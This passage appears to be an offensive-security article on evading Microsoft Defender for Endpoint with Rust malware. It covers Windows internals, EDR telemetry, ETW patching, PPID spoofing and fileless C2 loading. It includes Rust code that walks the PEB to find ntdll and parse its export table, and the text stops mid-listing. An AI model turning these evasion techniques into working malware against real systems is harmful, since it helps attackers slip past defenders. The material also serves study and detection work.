@@ -1,0 +1,1109 @@
+# https://eyilink.github.io/articles/edr_evasion_article_full.html
+
+<!DOCTYPE html><html lang="en">
+<body>
+
+  <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+
+  
+
+  <div class="content">
+    <div class="content-wrapper">
+
+      <div class="article-header">
+        <h1>Leveraging in-depth Windows Internals for Advanced EDR Evasion</h1>
+        <div class="article-meta">
+          <span>Research Article</span>
+          <span>|</span>
+          <span>Offensive Security</span>
+          <span>|</span>
+          <span>Rust Malware Development</span>
+          <span>|</span>
+          <span>60 min read</span>
+        </div>
+      </div>
+
+      <!-- ABSTRACT -->
+      <section id="abstract" class="abstract">
+        <h2>Abstract</h2>
+        <p>In this article, a <strong>variety of concepts related to EDR evasion and Windows internals</strong> will be tackled. Several techniques as well as a solution using <strong>Rust</strong> will be developed step by step. The solution will be tested mostly against <strong>Microsoft Defender for Endpoint</strong> (MDE). This article will focus on <strong>triggering least alerts and telemetry possible with a benign payload first</strong>, once this step is complete a C2 payload will be integrated. This article <strong>mostly compiles references from multiple sources</strong>, those references are listed in the X. References section.</p>
+        <p>The code of the Rust malware developped in this article can be found in this repository: <a href="https://github.com/Eyilink/StarGate" target="_blank">Malware Development - Stargate</a></p>
+        <ol>
+          <li>Traditional techniques for evading EDR telemetry in APT operations</li>
+          <li>The structure of Windows Portable Executables (PE)</li>
+          <li>Resolving NTDLL's address and Export Address Table (EaT) via low-level structures</li>
+          <li>Indirect syscalls, ETW patching and their limitations</li>
+          <li>Evading detection from kernel callbacks</li>
+          <li>Toward stealthier implementation</li>
+          <li>Integrating command and control payloads (C2)</li>
+          <li>Defeating static analysis: API hashing and obfuscation techniques</li>
+          <li>State of the art</li>
+          <li>References</li>
+        </ol>
+      </section>
+
+      <!-- SECTION I -->
+      <section id="s1">
+        <h2>I. Traditional Techniques for Evading EDR Telemetry in APT Operations</h2>
+        <p><strong>Traditional techniques used by APT groups</strong> will be studied first in order to maintain situational awareness and be aware of <strong>state of the art techniques</strong> used nowadays. As a result, this section will detail <strong>offensive techniques as well as protections</strong> implemented by Windows in order to have an overall panorama of what can be done. In order to understand modern kill chains, it is fundamental to <strong>understand what is behind functions of the Windows API and how an EDR works</strong>.</p>
+
+        <h3 id="s1a">A. Inside a Windows API Call: Mechanisms and Execution Flow</h3>
+        <p>Windows provides an <a href="https://learn.microsoft.com/en-us/windows/win32/api/" target="_blank">API</a> that implements <strong>all the functions that can be used in a Windows operating system</strong>. This API is implemented in <strong>user land</strong> meaning that the <strong>operating system is in charge of making low-level operations</strong> which are done in the <strong>kernel</strong>. Since the mid-2000s Windows does not allow sensitive modification in the kernel (PatchGuard feature) such as patching functions which could be used for EDR evasion. However, it is still possible to write <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk" target="_blank">drivers</a> that execute in <strong>kernel mode</strong>, nonetheless they are <strong>restricted</strong>. The article will focus on <strong>developing a user land solution</strong>. Therefore, no operation on drivers will be implemented.</p>
+        <p>To illustrate the execution flow of a Windows API call, we will take the <strong>Notepad binary creating a new file on the file system</strong>. For this, Notepad will call the <strong>CreateFileA</strong> function of the <strong>Kernel32 DLL</strong> which will call the <strong>NtCreateFile</strong> function of the <strong>NT DLL</strong>, which hosts <strong>NT functions that are used to translate calls into kernel mode</strong>. The NTDLL is executed in <strong>user mode</strong> (or user land). <strong>Each NT function is linked to an operation in kernel mode using a System Service Number (SSN)</strong> which is the <strong>identifier of the wanted kernel operation</strong>.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image17.png" alt="Windows API call execution flow diagram" class="article-img">
+        <p>To transfer the SSN, a function needs to <strong>push the value of the SSN in the EAX register</strong> and then <strong>call the syscall instruction</strong>. Once those instructions are called, the <strong>KiSystemService</strong> which is executed in kernel mode receives those parameters and <strong>resolves the corresponding kernel mode function using the System Service Descriptor Table</strong> (SSDT), which makes correspondences between SSNs and kernel functions. Once the function is resolved, it is called in the <strong>NT OS KRNL</strong> library.</p>
+        
+
+        <h3 id="s1b">B. Inner Workings of an EDR</h3>
+        <p>Modern EDRs raise alerts based on a <strong>correlation of events</strong> by performing a <strong>dynamic and static analysis</strong>. Usually, a suspicious kill chain is needed for an EDR to trigger an alert.</p>
+        <p>EDRs perform static analysis using <strong>the signature of the executable by calculating the hash of the file</strong>, <strong>strings present in the executables</strong>, the <strong>PE header</strong> content and Yara rules that allow <strong>automation</strong> of those controls in order to <strong>detect known sequences</strong> or schemes in a file.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>The <strong>entropy of artefacts</strong> is also computed during static analysis. If the <strong>entropy is beyond a certain threshold</strong>, meaning content of the file is too random which usually means an encryption algorithm has been used to obfuscate data such as a payload. The EDR will <strong>annotate it as suspicious</strong> since the entropy of the malware is beyond the threshold.</p>
+        </div>
+        <p>However, as the solution that will be created does not have a known signature yet, bypass techniques will <strong>focus on dynamic analysis performed by EDRs</strong>. First, EDRs perform API hooking which consists in <strong>hooking the called NT function by replacing the code in the NTDLL with the EDR's code</strong>. To do so, EDR replaces the <strong>MOV and SYSCALL instructions with a JMP instruction</strong>, which jumps into the EDR's code.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image19.png" alt="EDR API hooking: JMP instruction replacing MOV/SYSCALL" class="article-img">
+        <p>The EDR implements API hooking in <strong>user land</strong> as kernel mode is blocked as previously mentioned. Nonetheless, we will see that Windows provides <strong>kernel telemetry features</strong> for EDR providers to be able to subscribe to events happening in the kernel.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>Historical EDR providers used to implement <strong>API hooking directly in the kernel</strong> which used to trigger <strong>Blue Screen of Death</strong> (BSoD) when <strong>badly implemented</strong>. That's why they decided to restrict actions in the kernel in the mid-2000s. This feature is called <strong>PatchGuard</strong> or <strong>Kernel Patch Protection</strong>.</p>
+        </div>
+        <p>Windows provides a first source of telemetry in user land which is called <strong>Event Tracing for Windows</strong> (ETW). Basically, ETW follows a publish/subscribe pattern meaning that there is a <a href="https://gist.github.com/guitarrapc/35a94b908bad677a7310" target="_blank">list of providers</a> such as WMI, RPC, SMB, kernel events which <strong>produces events</strong>, and there are <strong>consumers</strong> such as EDRs, which <strong>are able to read a variety of events by subscribing to the wanted providers</strong>.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image18.png" alt="ETW publish/subscribe architecture" class="article-img">
+        <p>Nonetheless, this feature is implemented in <strong>user land</strong>. Therefore, it is <strong>possible to patch it by hooking the EtwEventWrite function and insert a return instruction</strong> at the beginning of the function in order to silence it. This technique is called <strong>API hooking</strong>, the same as the one EDRs implements which can be <strong>also used offensively</strong>.</p>
+        <p>To strengthen the existing mechanisms, Windows provides a mechanism which is called <strong>kernel callbacks</strong> where the <strong>kernel notifies the EDR by invoking directly the code implemented by the EDR in kernel mode</strong>, meaning the <strong>EDR driver</strong> (which is signed by Microsoft), when certain events occur. These events include:</p>
+        <ul>
+          <li><strong>File operations</strong>: Create, delete and modify.</li>
+          <li><strong>Process creation</strong> or <strong>termination</strong>: PsSetCreateProcessNotifyRoutine.</li>
+          <li><strong>Thread creation</strong>: PsSetCreateThreadNotifyRoutine.</li>
+          <li><strong>Registry changes</strong>: CmRegisterCallback.</li>
+          <li><strong>Network events</strong>.</li>
+        </ul>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image21.png" alt="Kernel callbacks notification mechanism" class="article-img">
+        <p>This constitutes a <strong>sturdy telemetry mechanism</strong> where an in-depth knowledge about Windows internals is needed in order to <strong>choose the right functions in the Windows API not to trigger kernel callbacks since they cannot be patched</strong> as it would require patching the kernel which is blocked in Windows by the PatchGuard protection.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>As previously mentioned, the code executed by the EDR in the kernel (driver) is also subject to restriction applied by <strong>PatchGuard</strong>. Hence, the EDR is only able to <strong>receive notification about certain events being triggered</strong> but cannot tamper with the kernel such as hooking NT functions in the kernel which would trigger <strong>PatchGuard</strong>.</p>
+        </div>
+        <p>Another mechanism which also requires a signed driver to work is called <strong>minifilters</strong> which <strong>permits to have a debug view with more verbosity about file system's operations</strong> in the kernel. However, with a vulnerable driver this protection could be patched.</p>
+        <p>A technique worth mentioning to correlate and detect functions used is <strong>call stack inspection</strong> which consists in inspecting the call stack and deducing <strong>nested function calls</strong> and patterns by <strong>correlating stack return addresses</strong>, during dynamic analysis. Each time a function is called, the system creates a <strong>stack frame</strong> which contains the <strong>return address</strong>, the arguments and local variables of the called function. All of this is kept in the stack which is a <strong>data structure</strong>. To build the call stack, which <strong>keeps track of nested function calls</strong> to be able to <strong>return correctly after each function finishes</strong>, the debugger will read the stack pointer (SP) and the frame pointer (FP) and <strong>follow these pointers in between frames</strong> and <strong>resolve addresses to function names</strong>, in order to construct the <strong>call stack</strong>:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image20.png" alt="Call stack construction by following frame pointers" class="article-img">
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>The <strong>concept of frame pointer</strong> (FP) disappears in <strong>x64</strong> as the x64 stack pointer (RSP) which is a 64 bits register already contains this information. Hence, call stack inspection is only performed with RSP in x64.</p>
+        </div>
+        <p>Last but not least, <strong>Protected Process Light</strong> (PPL) permits to <strong>protect a process</strong> from being stopped by another process, accessing its virtual memory from another process, attaching a debugger from another process, impersonating its threads, etc. <strong>LSASS uses PPL since it is not possible to attach a debugger</strong> to it so the command <strong>privilege::debug</strong> which grants the SeDebugPrivilege right to a token is not granted, therefore the LSASS process cannot be opened, and <strong>credentials cannot be read from memory</strong>.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>Windows by itself implements a few memory protection mechanisms such as <strong>Address Space Layout Randomization</strong> (ASLR) which <strong>randomize the memory space during</strong> each execution of a program in order to avoid memory modifications that can be made when a program has a static memory space. <strong>Data Execution Prevention</strong> (DEP) and <strong>Structured Exception Handler Overwrite Protection</strong> (SEHOP) are two protections that aim at <strong>reducing specific types of buffer overflow</strong> exploits. <strong>Credential Guard</strong> is a protection that uses <strong>virtualization</strong> to isolate the system's secrets to reduce credentials thefts.</p>
+        </div>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>Windows also implements malware protection which is the <strong>AntiMalware Scan Interface</strong> (AMSI) which <strong>scans Powershell scripts, Windows Script Host like VBScript, Office macros and certain .Net runtimes</strong>. Therefore, other scripting languages such as <strong>Rust are not subject to the AMSI</strong>, which reinforces the conviction of choosing Rust to develop malware.</p>
+        </div>
+        <p>The next two sections will explore how modern APT groups defeat EDR monitoring.</p>
+
+        <h3 id="s1c">C. APT Operations: Active Manipulation</h3>
+        <p>The first approach seen is called <strong>active manipulation</strong> and is <strong>centered around vulnerable drivers</strong>. This approach is considered <strong>aggressive</strong> and not stealthy. This approach aims at shutting down the <strong>EDR's agent by cutting the EDR's network</strong>, then finding a vulnerable driver <strong>to shut the EDR's process down completely by using kernel mode privileges</strong>. In some cases, API hooking was even performed by threat actors on functions such as NtOpenProcess <strong>in order to make the EDR unable to open the malware's process</strong>. Nonetheless, this <strong>approach makes a lot of noise which increases the likelihood of detection</strong>.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image26.png" alt="Active manipulation kill chain overview" class="article-img">
+        <p>Nonetheless, this approach requires <strong>local privileges escalation first</strong>, since modifying the hosts file is <strong>needed to cut the EDR's network</strong>. Then, a vulnerable driver is used to shut down the EDR's agent. <strong>Modern SIEM solutions trigger an alert when an agent running on an endpoint is not responding anymore</strong>. As a result, we won't use this approach in the solution we will develop as a <strong>stealthy approach is wanted</strong>. This kill chain will attract the attention of the blue team.</p>
+
+        <h3 id="s1d">D. APT Operations: Passive Evasion</h3>
+        <p><strong>Passive evasion</strong> consists in <strong>knowing what the EDR is monitoring</strong> and adapting the evasion accordingly. In modern operations, this translates in writing a <strong>dropper that will use indirect syscalls in order to evade user land hooking from the EDR</strong>, <strong>cut the EDR's telemetry by patching ETW</strong> and <strong>spoof the PID of another process to enroll it as the parent PID in the malware's process</strong>. All those evasion techniques aim at <strong>loading the C2 shellcode in memory in a fileless manner meaning no files are written on the file system</strong> and with a multistage loader which means that the payload is loading progressively in memory, therefore, the malware never was entirely in the system from the beginning.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image24.png" alt="Passive evasion approach diagram" class="article-img">
+        <p>This approach will be adopted to build the solution which will aim at making the least noise possible.</p>
+      </section>
+
+      <!-- SECTION II -->
+      <section id="s2">
+        <h2>II. The Structure of Windows Portable Executables (PE)</h2>
+        <p>First, it is important to understand <strong>how a process works</strong>. A process is an <strong>instance of a program in execution</strong>, typically launching an executable. Each process has an allocated <strong>Virtual Address Space</strong> (VAS), similarly each VAS is sectioned in segments <strong>.text</strong> (text section where the code resides), <strong>.data</strong> (data section containing initialized global variables and static variables), <strong>.rdata</strong> (read only initialized data section containing read-only initialized global variables and read-only static data variables), <strong>.pdata</strong> (exception handling section), <strong>.bss</strong> (BSS section holding uninitialized global and static data variables), <strong>.rsrc</strong> (resource section which safeguards resources such as images, icons and strings), <strong>.idata</strong> (section which details imported functions from other DLLs), <strong>.edata</strong> (section which details exported functions by the executable), <strong>.reloc</strong> (relocation section for relocating the executable's code and data when loaded in memory) and <strong>.tls</strong> (thread local storage) which provides specific storage for each thread running in the program. Each process also maintains <strong>a table of handles which is a catalog of references to different system objects</strong> (files, devices, registry key, etc.). Each process <strong>inherits the access token of the user that ran the executable</strong>, this token <strong>describes the process's privileges</strong>. Each process uses <strong>threads to execute tasks</strong>. A process can implement one or more threads.</p>
+        <p>Windows uses Portable Executable (PE) to <strong>encapsulate Dynamic Link Libraries</strong> (DLL) which can have the <code>.exe</code>, <code>.dll</code>, <code>.srv</code> (kernel modules) or <code>.cpl</code> extensions. Each PE has an <strong>MS-DOS</strong> section, a <strong>NT headers</strong> section (PE signature, file header, an optional header that is actually mandatory contains data directories), <strong>sections headers</strong> and <strong>sections</strong>.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image25.png" alt="PE file structure overview" class="article-img">
+        <p>Each of those sections are described in memory using <strong>structures</strong>. Fields beginning by <strong>PointerTo are the offset in bytes from the beginning of the file</strong>, fields <strong>beginning by Virtual are relative virtual addresses (RVA) where if the ImageBase reference is added to the field's value, the virtual address of the wanted element can be found</strong>, the real memory address is the absolute reference in memory however this concept won't be used as <strong>VAS is used for processes</strong>.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>The operating system is in charge of <strong>mapping pages</strong>, which are <strong>chunks of 4KB from the VAS, to frames, which are chunks of 4KB in real physical memory</strong>. The <strong>Memory Management Unit</strong> (MMU) is in charge of making the effective mapping using the <strong>Translation Lookaside Buffer</strong> (TLB) which <strong>caches recent mapping between pages and frames</strong>, as well as the <strong>swap space</strong> which is an extension on disk of the RAM when the RAM is full.</p>
+        </div>
+        <p>Primarily, the MS-DOS header is present because of <strong>legacy purposes</strong>, Microsoft added this header in order for PE files to <strong>have the capacity not to be executed on MS-DOS which is a legacy real time OS developed by Windows in the 80s</strong>. Hence, if it is tried to start a PE file on MS-DOS, the <strong>DOS stub</strong> containing "This program cannot be run in DOS mode" will <strong>show</strong>. So, the MS-DOS part is only for legacy purposes.</p>
+        <p>The NT headers section implements the <code>_IMAGE_NT_HEADERS</code> structure where the first field is Signature, <strong>its value should be 0x50450000 which is "PE\0\0"</strong>, if its value is different the <strong>loader will refuse to load the file</strong> as it represents a PE executable file. The second field is FileHeader which implements the <code>_IMAGE_FILE_HEADER</code> structure which mostly contains the field Machine which <strong>indicates which type of machine the file was compiled with</strong>, the NumberOfSections indicates the <strong>number of sections present</strong>, the TimeDateStamp which specifies the <strong>date of creation of the file</strong> and the SizeOfOptionalHeader which gives the <strong>size of the optional header</strong>. The last field is the OptionalHeader which is mandatory and implements the <code>_IMAGE_OPTIONAL_HEADER</code> which <strong>contains all the necessary information for the file to be loaded by the loader</strong>. This structure contain the Magic field which <strong>specifies the architecture</strong> (32 or 64 bits), the AddressOfEntryPoint which <strong>indicates the address of the entrypoint of the executable code</strong>, the ImageBase which indicates <strong>the default address of the first byte of the image when it is loaded in memory</strong>, the SizeOfImage field that specifies the <strong>size of the file</strong> and the Data Directory field which <strong>implements a table of IMAGE_DATA_DIRECTORY type</strong>. The Data Directory field is important because it contains the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> which contains <strong>the address of exported functions which is commonly called the Export Address Table (EAT)</strong>, it also contains the <code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> which <strong>contains the address of the imported functions which is commonly called the Import Address Table (IAT)</strong>, and it contains the <code>IMAGE_DIRECTORY_ENTRY_BASERELOC</code> which permits the <strong>executable to be rebased</strong> to a new ImageBase address, using this attribute as a buffer value, before loading the executable into memory.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image27.png" alt="NT headers and Optional Header structure" class="article-img">
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>When the term <strong>image</strong> is employed, it is in the <strong>context of compiling</strong>. Indeed, when <strong>code is compiled</strong>, it first gets compiled by a compiler which produces <strong>a file that translates the code into Assembly language</strong>, then it gets <strong>assembled using the Assembler which produces a file in machine code called an object file and is usually in COFF</strong> (Common Object File Format). Last, the object file needs to go through the <strong>linker</strong> in order to <strong>resolve dependencies</strong>, <strong>this will produce an image file</strong>, that is the term employed below. This process ensures that all references between different parts of the program are correctly resolved, <strong>allowing the code to function as a unit</strong>.</p>
+        </div>
+        <p>The section headers part is an array of multiple elements of <code>IMAGE_SECTION_HEADER</code>. There are <strong>as many elements as sections present in the file</strong>. Each structure contains <strong>essential information for a section to be loaded in memory</strong>, such as the VirtualAddress which is the RVA of the first byte of the loaded section in memory, the VirtualSize which is the size of the section, Characteristics which allows to specify flags (read-only section, etc.), the Name which indicates the section's name.</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image28.png" alt="Section headers array structure" class="article-img">
+        <p>All that information is <strong>used in order to instantiate a new process</strong> loading the wanted image. First, the PE file <strong>triggers a new process creation</strong> which makes the kernel create the EPROCESS structure in <strong>kernel mode</strong>. As a second step, the operating system reserves the <strong>needed virtual memory for the process</strong> which is the <strong>Virtual Address Space</strong> (VAS) in which the <strong>Process Environment Block</strong> (PEB) and <strong>Thread Environment Block</strong> (TEB) live. The PEB and TEB live in <strong>user mode</strong> as they exist <strong>for the code to be able to execute without constantly asking the kernel in which the EPROCESS structure lives</strong>. Third, sections of the PE file <strong>need to be mapped in memory as the PE file is not plainly copied into memory</strong>. Fourth, the <strong>operating system resolves the Import Address Table</strong> (IAT) such as the <strong>kernel32.dll</strong> DLL for the <strong>CreateFileA</strong> function. Fifth, <strong>resolved DLLs need to be loaded into the process's memory using Windows default loader</strong> which is <strong>LdrpLoadDLL</strong>. Those <strong>DLLs keep the PE structure when they are loaded in the process's memory</strong> as they are just a copy of the DLL on the disc. Finally, <strong>a thread is created to execute the process's tasks</strong> and placed at the <strong>Original Entry Point</strong> (OEP) in order to <strong>start the program's execution</strong>.</p>
+        
+        <img src="https://eyilink.github.io/articles/edr_article_images/image29.png" alt="Process loading steps overview" class="article-img">
+      </section>
+
+      <!-- SECTION III -->
+      <section id="s3">
+        <h2>III. Resolving NTDLL's Address and Export Address Table (EAT) via Low-Level Structures</h2>
+        <p>Resolving the NTDLL will enable us to use <strong>NT functions which are the last user mode piece of code before the execution in the kernel</strong>. This will permit direct syscalls. First, the <strong>address of the NTDLL</strong>, which is loaded in every process needs to be resolved. Second the <strong>table of exported functions needs to be resolved from the NTDLL's PE structure loaded in memory</strong>. This second step will permit resolving NT (exported) functions. Then, it will enable us to retrieve the syscall number (SSN) from NT functions in order to implement direct syscalls using assembly.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>Actually, syscalls can be performed by <strong>Nt</strong> or <strong>Zw</strong> functions which implement the <strong>exact same syscall stub</strong>. However, the difference lies in the <strong>source of the caller</strong> for Microsoft. A <strong>kernel-mode driver calls the Zw version</strong> of a native system services routine <strong>to inform the routine that the parameters come from a trusted kernel-mode source</strong>. In this case, the routine assumes that it can <strong>safely use the parameters without first validating them</strong>. However, if parameters might be from either a user-mode source or a kernel-mode source, the driver instead calls the <strong>Nt version of the routine</strong>, which determines, based on the history of the calling thread, <strong>whether parameters originated from user mode or kernel mode</strong>. Indeed, if the source is identified originating from user land, <strong>parameters will be validated before making the syscall</strong>. So, a syscall number can <strong>also be found from the Zw variant</strong>.</p>
+        </div>
+        <p>The <strong>NTDLL's address can be found by parsing the PEB structure</strong>. This is the stealthiest way since the <strong>combination of GetModuleHandleA and GetModuleInformation functions of the Windows API could be used to retrieve the NTDLL's address as well</strong>, however <strong>they might be hooked by the EDR</strong>. That's why using the PEB is stealthier. In the PEB, loaded DLLs are present and represented by a <strong>double-linked list</strong> that can be browsed until the NTDLL is found. This list implements the <strong>Flink</strong> field which is a pointer to the next loaded DLL and the <strong>Blink</strong> field which is a pointer to the previous loaded DLL. When the NTDLL is found, a <strong>suite of structures allows to find the NTDLL's address in the DllBase</strong> field:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>get_peb() / get_ntdll_base() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_peb</span>() <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">peb</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>;
+    <span class="hljs-meta">#[cfg(target_arch = <span class="hljs-string">"x86_64"</span>)]</span>
+    core::arch::asm!(
+        <span class="hljs-string">"mov {}, gs:[0x60]"</span>,
+        <span class="hljs-title function_ invoke__">out</span>(reg) peb
+    );
+    <span class="hljs-meta">#[cfg(target_arch = <span class="hljs-string">"x86"</span>)]</span>
+    core::arch::asm!(
+        <span class="hljs-string">"mov {}, fs:[0x30]"</span>,
+        <span class="hljs-title function_ invoke__">out</span>(reg) peb
+    );
+    peb
+}
+
+<span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_ntdll_base</span>(dll_name_to_search: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> core::ffi::c_void {
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">dll_addr</span>: *<span class="hljs-keyword">mut</span> core::ffi::c_void = ptr::<span class="hljs-title function_ invoke__">null_mut</span>();
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">ppeb</span> = <span class="hljs-title function_ invoke__">get_peb</span>() <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> windows::Win32::System::Threading::PEB;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">pldr</span>: *<span class="hljs-keyword">mut</span> windows::Win32::System::Threading::PEB_LDR_DATA = (*ppeb).Ldr;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">adress_first_plist</span>: *<span class="hljs-keyword">const</span> windows::Win32::System::Kernel::LIST_ENTRY = &amp;(*pldr).InMemoryOrderModuleList;
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">adress_first_node</span>: *<span class="hljs-keyword">const</span> windows::Win32::System::Kernel::LIST_ENTRY = (*adress_first_plist).Flink;
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">node</span> = adress_first_node;
+        <span class="hljs-keyword">while</span> node != adress_first_plist {
+            node = node.<span class="hljs-title function_ invoke__">sub</span>(<span class="hljs-number">1</span>);
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">p_data_table_entry</span>: *<span class="hljs-keyword">mut</span> windows::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY = node <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _;
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">full_dll_name</span>: <span class="hljs-type">String</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(
+                <span class="hljs-title function_ invoke__">pwstr_to_string</span>((*p_data_table_entry).FullDllName.Buffer.<span class="hljs-number">0</span>)
+                    .<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">"\\"</span>).<span class="hljs-title function_ invoke__">last</span>().<span class="hljs-title function_ invoke__">unwrap</span>()
+            );
+            <span class="hljs-keyword">if</span> dll_name_to_search == full_dll_name {
+                dll_addr = (*p_data_table_entry).DllBase;
+            }
+            node = node.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>);
+            node = (*node).Flink;
+        }
+        dll_addr
+    }
+}</code></pre>
+          </div>
+        </div>
+
+        <p>The <strong>PEB</strong> is resolved using the <strong>GS register on 64 bits architectures</strong> and the FS register on 32 bits architectures. The GS and FS registers <strong>respectively point to the TEB</strong> which <strong>contains a pointer to the PEB, at the 0x60 offset for x86_64</strong> and the 0x30 offset for x86.</p>
+        <p>Once the NTDLL's address is resolved, addresses of NT functions can be resolved using the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> of the Data Directory of the Optional Header section of a PE image, mentioned in the previous section. This is possible because a copy of the ntdll.dll file is loaded into memory <strong>which keeps the PE structure</strong>, <strong>therefore the EAT can be browsed (a combination of three arrays indexing each other) and parsed in order to know the target Nt function's address</strong>.</p>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>On the other hand, the GetProcAddress function of the Windows API could be used to resolve Nt functions’ addresses, however <strong>the EDR might have hooked this function</strong>.</p>
+        </div>
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>get_function_address() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_function_address</span>(ntdll_function: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> core::ffi::c_void {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">j</span>: <span class="hljs-type">i32</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">RVA</span>: <span class="hljs-type">usize</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">ntdll_base_address</span> = <span class="hljs-title function_ invoke__">get_instance</span>();
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">p_img_dos_head</span>: PIMAGE_DOS_HEADER = ntdll_base_address <span class="hljs-keyword">as</span> PIMAGE_DOS_HEADER;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">p_img_nt_head</span>: PIMAGE_NT_HEADERS = <span class="hljs-keyword">unsafe</span> {
+        (ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>((*p_img_dos_head).e_lfanew <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>)) <span class="hljs-keyword">as</span> PIMAGE_NT_HEADERS
+    };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">p_img_exp_dir</span>: PIMAGE_EXPORT_DIRECTORY = <span class="hljs-keyword">unsafe</span> {
+        (ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>(
+            (*p_img_nt_head).OptionalHeader
+                .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.<span class="hljs-number">0</span> <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>]
+                .VirtualAddress <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>
+        )) <span class="hljs-keyword">as</span> PIMAGE_EXPORT_DIRECTORY
+    };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">address</span>: *<span class="hljs-keyword">const</span> <span class="hljs-type">u32</span> = <span class="hljs-keyword">unsafe</span> {
+        ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>((*p_img_exp_dir).AddressOfFunctions <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u32</span>
+    };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">name</span>: *<span class="hljs-keyword">const</span> <span class="hljs-type">u32</span> = <span class="hljs-keyword">unsafe</span> {
+        ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>((*p_img_exp_dir).AddressOfNames <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u32</span>
+    };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">ordinal</span>: *<span class="hljs-keyword">const</span> <span class="hljs-type">u16</span> = <span class="hljs-keyword">unsafe</span> {
+        ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>((*p_img_exp_dir).AddressOfNameOrdinals <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u16</span>
+    };
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-keyword">for</span> <span class="hljs-variable">j</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..=(*p_img_exp_dir).NumberOfNames {
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">name_rva</span> = *name.<span class="hljs-title function_ invoke__">add</span>(j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">name_cstr</span> = std::ffi::CStr::<span class="hljs-title function_ invoke__">from_ptr</span>(
